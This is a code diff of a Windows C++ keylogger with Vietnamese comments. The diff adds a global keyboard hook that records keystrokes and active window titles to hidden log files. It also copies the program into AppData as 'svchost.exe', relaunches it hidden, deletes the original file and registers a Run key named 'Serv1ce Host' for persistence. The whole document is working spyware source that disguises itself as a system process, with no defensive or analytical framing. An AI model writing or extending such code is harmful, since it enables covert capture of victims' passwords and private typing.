@@ -10,21 +10,30 @@
 #include <map>
 #include <iterator>
 #include <utility>
+#include <chrono>
 
-std::fstream FILELOG;
+#define BUFSIZE 1000
 
 typedef std::pair<std::string, std::string> keypair;
 
+//---------------------------------------------
+std::fstream FILELOG;
 std::map<int, keypair> keyS;
 std::map<int, std::string> keyO;
 
-void writeLog(std::string str)
-{
-    std::cout << str;
-}
+HHOOK hHook;
+std::wstring m_file;
+std::wstring m_dir;
+WCHAR m_log[BUFSIZE];
 
 
-void init()
+//--------------------------------------------
+void writeLog(std::string str);
+void getfiletime();
+
+
+
+void initKey()
 {
     // key có 2 trạng thái
     keyS[0x30] = { "0",")" };
@@ -50,10 +59,10 @@ void init()
     keyS[0xDE] = { "'","\"" };
     for (int i = 0x41; i <= 0x5A; ++i)
     {
-        keyS.insert(std::pair<int, keypair>(i, keypair(std::string(1,static_cast<char>(i+0x20)), std::string(1, static_cast<char>(i)))));
+        keyS.insert(std::pair<int, keypair>(i, keypair(std::string(1, static_cast<char>(i + 0x20)), std::string(1, static_cast<char>(i)))));
     }
 
-    //----------------------------------------------
+    // Key 1 trạng thái
     for (int i = 0x60; i <= 0x69; ++i)
     {
         keyO.insert({ i,std::to_string(i - 0x60) });
@@ -61,7 +70,7 @@ void init()
 
     for (int i = VK_F1; i <= VK_F24; ++i)
     {
-        keyO.insert({ i,"[F" + std::to_string(i - VK_F1 + 1)+"]" });
+        keyO.insert({ i,"[F" + std::to_string(i - VK_F1 + 1) + "]" });
     }
 
     keyO[VK_NUMLOCK] = "[NUMLOCK]";
@@ -85,7 +94,7 @@ void init()
     keyO[VK_PAUSE] = "[PAUSE]";
     keyO[VK_CAPITAL] = "[CAPS LOCK]";
     keyO[VK_ESCAPE] = "[ESC]";
-    keyO[VK_SPACE] = "[SPACEBAR]";
+    keyO[VK_SPACE] = " ";
     keyO[VK_PRIOR] = "[PAGE UP]";
     keyO[VK_NEXT] = "[PAGE DOWN]";
     keyO[VK_END] = "[END]";
@@ -108,8 +117,96 @@ void init()
     keyO[VK_SUBTRACT] = "-";
     keyO[VK_DECIMAL] = ".";
     keyO[VK_DIVIDE] = "/";
-
+    keyO[VK_BROWSER_BACK] = "[BROWSER BACK]";
+    keyO[VK_BROWSER_FORWARD] = "[BROWSER FORWARD]";
+    keyO[VK_BROWSER_REFRESH] = "[BROWSER REFRESH]";
+    keyO[VK_BROWSER_STOP] = "[BROWSER STOP]";
+    keyO[VK_BROWSER_SEARCH] = "[BROWSER SEARCH]";
+    keyO[VK_BROWSER_FAVORITES] = "[BROWSER FAVORITES]";
+    keyO[VK_BROWSER_HOME] = "[BROWSER HOME]";
+    keyO[VK_VOLUME_MUTE] = "[VOLUME MUTE]";
+    keyO[VK_VOLUME_DOWN] = "[VOLUME DOWN]";
+    keyO[VK_VOLUME_UP] = "[VOLUME UP]";
+    keyO[VK_MEDIA_NEXT_TRACK] = "[NEXT TRACK]";
+    keyO[VK_MEDIA_PREV_TRACK] = "[PREV TRACK]";
+    keyO[VK_MEDIA_STOP] = "[MEDIA STOP]";
+    keyO[VK_MEDIA_PLAY_PAUSE] = "[MEDIA PLAY PAUSE]";
 }
+
+void init()
+{
+    initKey();
+    //
+    WCHAR buf[BUFSIZE];
+    GetEnvironmentVariable(L"appdata", buf, BUFSIZE);
+    m_dir = std::wstring(buf) + L"\\Ser1ce Host\\";
+    m_file = m_dir + L"svchost.exe";
+    CreateDirectory(m_dir.c_str(), NULL);
+    getfiletime();
+    
+}
+
+
+
+void getfiletime()
+{
+    SYSTEMTIME systime;
+    GetLocalTime(&systime);
+    wsprintf(m_log, L"%s%02d%02d%d-%02d%02d%02d.dat",m_dir.c_str(), systime.wDay, systime.wMonth, systime.wYear, systime.wHour, systime.wMinute, systime.wSecond);
+}
+
+
+std::wstring getTime()
+{
+    SYSTEMTIME systime;
+    GetLocalTime(&systime);
+    WCHAR buf[BUFSIZE];
+    memset(buf, 0, sizeof(buf));
+    wsprintf(buf, L"\r\n\n%02d/%02d/%d %02d:%02d:%02d - [",systime.wDay,systime.wMonth,systime.wYear, systime.wHour, systime.wMinute, systime.wSecond);
+    return buf;
+}
+
+
+
+void writeToFile(std::wstring str)
+{
+    DWORD dwBytesWritten;
+    HANDLE hFile = CreateFile(m_log, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    WriteFile(hFile, str.c_str(), str.length()*sizeof(WCHAR), &dwBytesWritten, NULL);
+    CloseHandle(hFile);
+    //std::wcout << str;
+}
+
+
+void writeTitle()
+{
+    static WCHAR wnd_title[BUFSIZE];
+    static WCHAR wnd_prevtitle[BUFSIZE];
+    //std::cout << str;
+    memset(wnd_title, 0, sizeof(wnd_title));
+    HWND hwnd = GetForegroundWindow();
+    GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
+    if (wcscmp(wnd_prevtitle, wnd_title) != 0)
+    {
+        wcscpy_s(wnd_prevtitle, sizeof(wnd_prevtitle), wnd_title);
+        writeToFile(getTime());
+        writeToFile(wnd_title);
+        writeToFile(L"]\n");
+    }
+}
+
+
+
+
+void writeLog(std::string str)
+{
+    writeTitle();
+    std::wstring wstr(str.begin(), str.end());
+    writeToFile(wstr);
+    //std::cout << str;
+}
+
+
 
 void windowsTitle()
 {
@@ -133,20 +230,15 @@ void windowsTitle()
 }
 
 
-/*
 void AutoStart()
 {
-    char Driver[MAX_PATH];
     HKEY hKey;
-    std::string ff_path = "svchost.exe";
-    strcpy(Driver, ff_path.c_str());
-    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-    RegSetValueExA(hKey, "Dit", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
+    //WCHAR [BUFSIZE];
+    //wcscpy_s(key,sizeof(key), m_file.c_str());
+    RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+    RegSetValueEx(hKey, L"Serv1ce Host", 0, REG_SZ, (BYTE*)m_file.c_str(), m_file.length()*sizeof(WCHAR));
     RegCloseKey(hKey);
 }
-*/
-
-
 
 LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
 {
@@ -191,10 +283,17 @@ LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
                 writeLog(it->second);
             }
         }
+        break;
 
-        writeLog("  ->  "+std::to_string(vkCode));
-        writeLog("\n");
-
+    case WM_SYSKEYDOWN:
+        vkCode = pKey->vkCode;
+        for (std::map<int, std::string>::iterator it = keyO.begin(); it != keyO.end(); ++it)
+        {
+            if (it->first == vkCode)
+            {
+                writeLog(it->second);
+            }
+        }
         break;
     default:
         return CallNextHookEx(NULL, Code, wParam, lParam);
@@ -202,30 +301,77 @@ LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
     return 0;
 }
 
+
+
+bool Install()
+{
+    HMODULE hModule = GetModuleHandle(NULL);
+    WCHAR filename[BUFSIZE];
+    memset(filename, 0, sizeof(filename));
+    GetModuleFileName(hModule, filename, sizeof(filename));
+
+    if (wcscmp(filename, m_file.c_str()))
+    {
+        // Copy file và thực thi file mới
+        CopyFile(filename, m_file.c_str(), FALSE);
+        WCHAR cmdl[BUFSIZE];
+        memset(cmdl, 0, sizeof(cmdl));
+        wsprintf(cmdl,L"\"%s\"", filename);
+  
+        ShellExecute(NULL, L"open", m_file.c_str(), cmdl, NULL, SW_HIDE);
+        return false;
+    }
+
+
+    return true;
+}
+
+
 void InstallHook()
 {
-    HHOOK hHook;
+    
     HINSTANCE hModule = GetModuleHandle(NULL);
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyProc, hModule, 0);
-
-
 }
 
 
 
-
-int main()
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
-    //std::thread t1(windowsTitle);
+    LPWSTR* argv;
+    int argc;
+    argv = CommandLineToArgvW(GetCommandLine(), &argc);
     
+    if (argc > 1)
+    {
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+        _wremove(argv[1]);
+    }
     init();
+    AutoStart();
+    if (!Install())
+    {
+        return 0;
+    }
+
     InstallHook();
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)!=0)
+    while (GetMessage(&msg, NULL, 0, 0) != 0)
     {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+    UnhookWindowsHookEx(hHook);
+    return 0;
+}
+
+
+/*
+int wmain(int argc, WCHAR **argv)
+{
+    //FreeConsole();
+    
 
 }
+*/
 
